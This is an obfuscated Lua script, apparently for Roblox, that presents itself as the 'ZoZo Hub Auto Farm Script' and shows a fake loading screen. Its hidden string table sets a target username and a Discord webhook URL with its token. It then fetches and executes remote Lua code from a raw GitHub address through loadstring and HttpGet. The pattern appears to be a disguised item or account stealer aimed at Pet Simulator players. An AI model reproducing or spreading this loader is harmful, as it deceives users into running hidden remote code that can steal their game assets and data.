--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"..",function(v31)if (v1(v31,2)==79) then v20=v0(v3(v31,1,1));return "";else local v69=v2(v0(v31,16));if v20 then local v79=v5(v69,v20);v20=nil;return v79;else return v69;end end end);v18=1;end if (3==v18) then v24=nil;function v24()local v32=1724 -(89 + 1603 + 32) ;local v33;local v34;local v35;local v36;while true do if (v32==(0 + (0 -0))) then v33,v34,v35,v36=v1(v16,v19,v19 + (1174 -(810 + 361)) );v19=v19 + (1364 -(998 + 362)) ;v32=2 -1 ;end if (v32==(4 -3)) then return (v36 * (41030911 -24253695)) + (v35 * (204537 -(327430 -188429))) + (v34 * (914 -658)) + v33 ;end end end v25=nil;v18=4;end if (v18==4) then function v25()local v37=v24();local v38=v24();local v39=1;local v40=(v21(v38,2 -1 ,20) * ((9 -7)^(116 -(147 -63)))) + v37 ;local v41=v21(v38,1950 -(1815 + 114) ,3 + 28 );local v42=((v21(v38,15 + 17 )==(1 + 0 + 0)) and  -(1 + 0)) or (688 -(67 + 620)) ;if (v41==((0 -0) + 0)) then if (v40==(0 -0)) then return v42 * (0 + 0) ;else v41=145 -(73 + 71) ;v39=30 -(27 + 3 + 0) ;end elseif (v41==2047) then return ((v40==(0 + 0)) and (v42 * ((1 + 0)/(0 + 0)))) or (v42 * NaN) ;end return v8(v42,v41-1023 ) * (v39 + (v40/((1 + 1)^52))) ;end v26=nil;function v26(v43)local v44;if  not v43 then v43=v24();if (v43==(0 -0)) then return "";end end v44=v3(v16,v19,(v19 + v43) -(1470 -(819 + 650)) );v19=v19 + v43 ;local v45={};for v67=1, #v44 do v45[v67]=v2(v1(v3(v44,v67,v67)));end return v6(v45);end v18=5;end if (7==v18) then function v30(v46,v47,v48)local v49=0;local v50;local v51;local v52;while true do if (v49==1) then v52=v46[3];return function(...)local v80=1;local v81= -1;local v82={...};local v83=v12("#",...) -1 ;local function v84()local v87=v50;local v88=v51;local v89=v52;local v90=v28;local v91={};local v92={};local v93={};for v97=0 + 0 ,v83 do if ((v97>=v89) or ((1780 + 2591)<=(2342 + 2026))) then v91[v97-v89 ]=v82[v97 + ((1 + 0) -0) ];else v93[v97]=v82[v97 + (3 -2) ];end end local v94=(v83-v89) + (1 -0) ;local v95;local v96;while true do local v98=0 + (0 -0) ;local v99;while true do if (((304 -(47 + 257))==v98) or (((397 + 2877) -(852 + 156))<=(739 + 386))) then v99=(0 -0) -0 ;while true do if ((v99==((236 + 546) -(574 + (579 -371)))) or ((2041 -(450 + 22 + 51))<=(435 -(6 + 19)))) then local v107=(0 -0) -0 ;while true do if ((v107==(1 -0)) or (2978<=(4896 -3431))) then v99=1;break;end if (((1021 + 88)<=((3054 + 401) -(992 + 27))) and ((0 -(0 + 0))==v107)) then v95=v87[v80];v96=v95[1 -0 ];v107=4 -3 ;end end end if ((v99==(1 + 0)) or ((262 + 203)>(2517 -((2184 -1313) + 203)))) then if (((2848 -(186 + 504))>=(4666 -3614)) and (v96<=(1997 -(894 + 1097)))) then if ((v96<=(8 -6)) or ((7164 -(7423 -(673 + 1106)))<=(2214 -(561 + 782)))) then if ((1479<=(3775 -(587 + 842))) and (v96<=(927 -(876 + 51)))) then v80=v95[3];elseif (((6642 -(1157 + 610))>(4718 -2593)) and (v96==(2 -1))) then v48[v95[(2 -0) + 1 ]]=v93[v95[914 -(42 + 29 + 841) ]];elseif ((v93[v95[2]]==v95[10 -6 ]) or (3734<(383 + (887 -285)))) then v80=v80 + (2 -1) ;else v80=v95[11 -8 ];end elseif ((v96<=(1887 -((2641 -1964) + 1206))) or ((1681 -786)<=(495 + 18 + 236))) then if ((v96>(3 -0)) or (376<=(104 + 67))) then local v131=1042 -(274 + 768) ;local v132;local v133;local v134;local v135;local v136;while true do if ((2956>=(3119 -1591)) and (v131==2)) then v136=nil;while true do if ((v132==(1 + 0)) or ((362 + 66)>4786)) then v81=(v135 + v133) -((1027 + 269) -(134 + 1161)) ;v136=1539 -(926 + 613) ;v132=414 -(43 + 369) ;end if ((v132==(2 + 0)) or ((3209 -(992 + 528))==(20229 -15452))) then for v174=v133,v81 do local v175=137 -(18 + 119) ;local v176;while true do if (((4283 -(81 + 987))<=(5726 -(869 + 257))) and (v175==0)) then v176=1562 -(460 + 1102) ;while true do if ((0==v176) or (2070>(16519 -12376))) then v136=v136 + 1 ;v93[v174]=v134[v136];break;end end break;end end end break;end if ((v132==((0 -0) + 0)) or ((3950 + 868)<=(11402 -6967))) then local v171=0;while true do if (((10416 -6795)>=(1568 -(239 + 370))) and (v171==(1 + 0))) then v132=984 -(788 + 195) ;break;end if (((995 + 1597)<(5001 -(938 + 334))) and (v171==0)) then v133=v95[2 + 0 ];v134,v135=v90(v93[v133](v13(v93,v133 + ((6 -4) -1) ,v95[3])));v171=4 -3 ;end end end end break;end if ((v131==0) or ((8160 -3346)<=(4144 -(1304 + 117)))) then v132=0 + 0 ;v133=nil;v131=1 + 0 ;end if ((v131==(1751 -(360 + 1390))) or (3255<=(167 + 3014))) then v134=nil;v135=nil;v131=1039 -(478 + 207 + 352) ;end end else v93[v95[6 -4 ]]=v95[3]~=((171 + 30) -((252 -107) + 56)) ;end elseif (((9398 -6685)<=(2724 + 667)) and (v96==5)) then if (((4717 -3263)<(3328 -(1374 + 146))) and (v95[1627 -(350 + 355 + 920) ]==v93[v95[11 -7 ]])) then v80=v80 + (2 -(1 + 0)) ;else v80=v95[3];end else for v147=v95[5 -3 ],v95[2 + 1 ] do v93[v147]=nil;end end elseif (((2100 + 434 + 818)<(8560 -5110)) and (v96<=(1874 -((3631 -(1529 + 454)) + 217)))) then if ((v96<=((15 + 4) -(35 -23))) or ((2304 -1287)>(4890 -((3159 -1913) + 383)))) then local v119=(194 -(104 + 90)) -0 ;local v120;local v121;local v122;while true do if ((v119==(1 -0)) or ((2290 + 900)>(561 + 3150))) then v122=nil;while true do if ((v120==(1 + 0)) or (1605==(2895 + 536))) then v93[v121 + (1 -0) ]=v122;v93[v121]=v122[v95[4]];break;end if ((((3298 + 15241) -13888)==((2391 + 2886) -(417 + 209))) and (v120==(0 + 0))) then local v163=0 -0 ;local v164;while true do if ((v163==((1706 -(241 + 1465)) -0)) or ((1181 -756)>(2664 -(868 + 393)))) then v164=0 -0 ;while true do if (((4137 -1868)<=(3079 -(137 + 101 + 152))) and (1==v164)) then v120=702 -(348 + 353) ;break;end if ((v164==(0 -0)) or ((1557 + 403)==(1961 + 2134))) then v121=v95[4 -2 ];v122=v93[v95[10 -7 ]];v164=1 + 0 ;end end break;end end end end break;end if ((v119==(0 -0)) or ((3353 -(692 + (2971 -1704)))>(5402 -(468 + 555)))) then local v149=0 + 0 ;while true do if (((2819 -(168 + 284))==(3646 -(116 + 1163))) and (v149==0)) then v120=0 + (0 -0) ;v121=nil;v149=1 + 0 ;end if ((v149==(1 + 0 + 0)) or (2977>=3878)) then v119=1 + 0 ;break;end end end end elseif ((v96>(1811 -(169 + 1634))) or ((2640 -(397 + 529))>=2070)) then do return;end else v93[v95[6 -4 ]]=v95[6 -3 ];end elseif ((v96<=11) or ((1713 + 892)==(1006 + 675))) then if (((3776 -2423)==((6855 -1325) -4177)) and (v96==10)) then local v140=0 -0 ;local v141;local v142;while true do if (((6390 -(336 + 1182))>=(988 + 1002)) and ((0 -(0 + 0))==v140)) then v141=0;v142=nil;v140=1;end if ((961<=((1463 + 1200) -(237 + 386))) and (v140==1)) then while true do if (((34 + (1819 -(1120 + 642)))<(10565 -6250)) and ((0 -0)==v141)) then v142=v95[2];v93[v142]=v93[v142](v13(v93,v142 + (1906 -(1005 + 900)) ,v81));break;end end break;end end else v93[v95[564 -(42 + 520) ]]();end elseif ((v96==(725 -(592 + 42 + 79))) or ((1641 -(56 + 95 + 1016))>=895)) then v93[v95[1 + 1 ]][v95[2 + 1 ]]=v95[4];else v93[v95[2]]=v48[v95[2 + 1 ]];end v80=v80 + (1997 -(1079 + 917)) ;break;end end break;end end end end A,B=v28(v11(v84));if  not A[1] then local v100=v46[4][v80] or "?" ;error("Script error at ["   .. v100   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end if (v49==0) then v50=v46[1];v51=v46[2];v49=1;end end end return v30(v29(),{},v17)(...);end if (v18==6) then v29=nil;function v29()local v53=0;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v53~=0) then else local v76=0;while true do if (v76==0) then v54=0 -0 ;v55=nil;v76=1;end if (v76~=1) then else v53=1;break;end end end if (v53==(788 -(471 + 315))) then v58=nil;v59=nil;v53=6 -3 ;end if (v53==(1605 -(1114 + 488))) then v60=nil;while true do local v85=1908 -(1370 + 538) ;local v86;while true do if (v85==0) then v86=1571 -(810 + 761) ;while true do if (v86==(0 -0)) then local v106=0;while true do if (v106==0) then if ((2 -1)~=v54) then else local v113=0;local v114;while true do if (v113==(0 + 0)) then v114=1091 -(99 + 992) ;while true do if (v114~=1) then else v60={};v54=6 -4 ;break;end if (v114==(0 -0)) then local v150=0;while true do if ((169 -(20 + 149))~=v150) then else v58={v55,v56,nil,v57};v59=v24();v150=1;end if (1~=v150) then else v114=1;break;end end end end break;end end end if (3~=v54) then else local v115=0;local v116;while true do if (v115~=(0 + 0)) then else v116=0 -0 ;while true do local v125=0 + 0 ;while true do if (v125==0) then if (v116~=(1162 -(669 + 492))) then else return v58;end if (v116==0) then local v165=0 -0 ;while true do if (v165==1) then v116=1;break;end if (v165==0) then for v179=1,v24() do v56[v179-(1 + 0) ]=v29();end for v181=1,v24() do v57[v181]=v24();end v165=1;end end end break;end end end break;end end end v106=1403 -(646 + 756) ;end if (v106~=(119 -(70 + 48))) then else v86=1;break;end end end if (v86==1) then if (v54==(534 -(75 + 457))) then local v108=0 -0 ;local v109;while true do if ((0 -0)==v108) then v109=0;while true do if (v109~=1) then else for v126=1,v24() do local v127=0 -0 ;local v128;while true do if (v127==0) then v128=v22();if (v21(v128,1,1 + 0 )~=0) then else local v166=267 -(56 + 211) ;local v167;local v168;local v169;local v170;while true do if (v166~=2) then else while true do if (v167~=(808 -(469 + 339))) then else local v187=0;local v188;while true do if (v187~=(0 -0)) then else v188=0;while true do if (v188~=1) then else v167=1;break;end if (v188==(0 -0)) then v168=v21(v128,2,6 -3 );v169=v21(v128,9 -5 ,2 + 4 );v188=2 -1 ;end end break;end end end if (v167~=(1 + 1)) then else local v189=0 -0 ;while true do if (v189==(651 -(105 + 546))) then if (v21(v169,102 -(77 + 24) ,1 -0 )==(865 -(506 + 358))) then v170[1566 -(312 + 1252) ]=v60[v170[1 + 1 ]];end if (v21(v169,2 + 0 ,1046 -(335 + 709) )==(1 + 0)) then v170[3]=v60[v170[3]];end v189=1 + 0 ;end if (v189~=(1794 -(945 + 848))) then else v167=835 -(252 + 580) ;break;end end end if (v167==1) then local v190=0 -0 ;while true do if (v190==(0 -0)) then v170={v23(),v23(),nil,nil};if (v168==(1981 -(426 + 1555))) then local v201=0;local v202;while true do if (v201~=(918 -(727 + 191))) then else v202=0;while true do if ((1401 -(999 + 402))~=v202) then else v170[6 -3 ]=v23();v170[4 + 0 ]=v23();break;end end break;end end elseif (v168==(807 -(4 + 802))) then v170[3]=v24();elseif (v168==2) then v170[3]=v24() -((2 -0)^16) ;elseif (v168~=(7 -4)) then else local v207=254 -(215 + 39) ;while true do if (v207~=0) then else v170[3]=v24() -((1162 -(650 + 510))^16) ;v170[615 -(102 + 509) ]=v23();break;end end end v190=1 -0 ;end if (v190==1) then v167=2;break;end end end if (v167==3) then if (v21(v169,3,1 + 2 )~=(391 -(234 + 156))) then else v170[19 -15 ]=v60[v170[4]];end v55[v126]=v170;break;end end break;end if (v166==(1358 -(604 + 753))) then local v177=0;while true do if (v177~=(0 + 0)) then else v169=nil;v170=nil;v177=1 -0 ;end if (1~=v177) then else v166=905 -(84 + 819) ;break;end end end if (v166==0) then local v178=0 -0 ;while true do if (v178~=1) then else v166=1 -0 ;break;end if (v178==0) then v167=0;v168=nil;v178=1;end end end end end break;end end end v54=2 + 1 ;break;end if (v109==0) then local v123=0 -0 ;while true do if (v123==0) then for v154=1 + 0 ,v59 do local v155=48 -(9 + 39) ;local v156;local v157;local v158;local v159;while true do if (v155==(1 + 1)) then while true do if (v156~=(30 -(24 + 5))) then else v159=nil;while true do if (v157==0) then v158=v22();v159=nil;v157=1;end if (v157~=1) then else if (v158==1) then v159=v22()~=(0 + 0) ;elseif (v158==(570 -(139 + 429))) then v159=v25();elseif (v158~=(3 + 0)) then else v159=v26();end v60[v154]=v159;break;end end break;end if (v156==0) then local v183=1150 -(166 + 984) ;while true do if (v183==(1 + 0)) then v156=1;break;end if (v183==(0 -0)) then v157=0 + 0 ;v158=nil;v183=1 + 0 ;end end end end break;end if (v155==0) then v156=0;v157=nil;v155=1 + 0 ;end if (v155==1) then v158=nil;v159=nil;v155=1 + 1 ;end end end v58[3]=v22();v123=1 + 0 ;end if (v123==(3 -2)) then v109=364 -(352 + 11) ;break;end end end end break;end end end if (v54==0) then local v110=0;while true do if (v110~=0) then else local v117=0;while true do if (v117~=(0 + 0)) then else local v124=0;while true do if (v124==1) then v117=1 + 0 ;break;end if (v124==(0 + 0)) then v55={};v56={};v124=1 + 0 ;end end end if (1~=v117) then else v110=1;break;end end end if (v110==1) then v57={};v54=1;break;end end end break;end end break;end end end break;end if (v53==1) then local v77=0;local v78;while true do if (v77==0) then v78=0;while true do if (v78==(0 + 0)) then local v105=0 -0 ;while true do if (0~=v105) then else v56=nil;v57=nil;v105=1;end if (v105~=1) then else v78=1059 -(171 + 887) ;break;end end end if (v78~=1) then else v53=1250 -(849 + 399) ;break;end end break;end end end end end v30=nil;v18=7;end if (v18==5) then v27=v24;v28=nil;function v28(...)return {...},v12("#",...);end v18=6;end if (v18==1) then v21=nil;function v21(v61,v62,v63)if v63 then local v70=646 -(206 + 440) ;local v71;while true do if (v70==(806 -(555 + 251))) then v71=(v61/((1 + 1)^(v62-((440 + 894) -(229 + 1104)))))%((701 -(446 + 253))^(((v63-(2 -1)) -(v62-(129 -(19 + 109)))) + 1 + 0)) ;return v71-(v71%(1 + 0)) ;end end else local v72=(409 -(4 + 403))^(v62-(3 -(1 + 1))) ;return (((v61%(v72 + v72))>=v72) and (1 -(526 -(265 + 261)))) or (0 + (0 -0)) ;end end v22=nil;v18=2;end if (v18==2) then function v22()local v64=v1(v16,v19,v19);v19=v19 + 1 ;return v64;end v23=nil;function v23()local v65,v66=v1(v16,v19,v19 + 1 + 1 );v19=v19 + (2 -0) ;return (v66 * (358 -(25 + 77))) + v65 ;end v18=3;end end end v15("LOL!193O00028O0003083O00557365726E616D65030F3O00535441595F4354652O64794265617203073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31302O393O303832353039322O37312O38302F302O564A584C70544C39575A647177364237334250326A35535A36424C777548724D797338504D64634379635A39574D6A554D34794170307A794D514A494D6E7074414E026O00F03F027O0040026O00084003023O005F4703053O00546578743103103O004C6F6164696E67205363726970742O2E03053O005465787432031B3O0053637269707420742O6F6B206C6F6E67657220746F206C6F61642E030D3O006C6F6164696E677363722O656E03103O00437573746F6D5363726970744E616D6503193O005A6F5A6F20487562204175746F204661726D20536372697074026O00104003053O005465787433030D3O0047652O74696E6720446174612E03053O005465787434030C3O00536176696E6720446174612E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C7561004F3O0012083O00014O0006000100013O0026023O00020001000100044O00020001001208000100013O002602000100140001000100044O00140001001208000200013O0026020002000F0001000100044O000F0001001208000300033O001201000300023O001208000300053O001201000300043O001208000200063O000E05000600080001000200044O00080001001208000100063O00044O0014000100044O00080001002602000100230001000700044O00230001001208000200013O0026020002001B0001000600044O001B0001001208000100083O00044O00230001002602000200170001000100044O0017000100120D000300093O00300C0003000A000B00120D000300093O00300C0003000C000D001208000200063O00044O00170001002602000100320001000600044O00320001001208000200013O0026020002002A0001000600044O002A0001001208000100073O00044O00320001000E05000100260001000200044O002600012O0003000300013O0012010003000E3O00120D000300093O00300C0003000F0010001208000200063O00044O00260001002602000100410001000800044O00410001001208000200013O002602000200390001000600044O00390001001208000100113O00044O00410001000E05000100350001000200044O0035000100120D000300093O00300C00030012001300120D000300093O00300C000300140015001208000200063O00044O00350001002602000100050001001100044O0005000100120D000200163O00120D000300173O002007000300030018001208000500194O0004000300054O000A00023O00022O000B00020001000100044O004E000100044O0005000100044O004E000100044O000200012O00093O00017O004F3O00023O00033O00053O00053O00063O00083O00083O00093O000B3O000B3O000C3O000C3O000D3O000D3O000E3O00103O00103O00113O00123O00133O00163O00163O00173O00193O00193O001A3O001B3O001D3O001D3O001E3O001E3O001F3O001F3O00203O00213O00243O00243O00253O00273O00273O00283O00293O002B3O002B3O002C3O002C3O002D3O002D3O002E3O002F3O00323O00323O00333O00353O00353O00363O00373O00393O00393O003A3O003A3O003B3O003B3O003C3O003D3O00403O00403O00413O00413O00413O00413O00413O00413O00413O00423O00433O00453O00463O00483O00",v9(),...);end
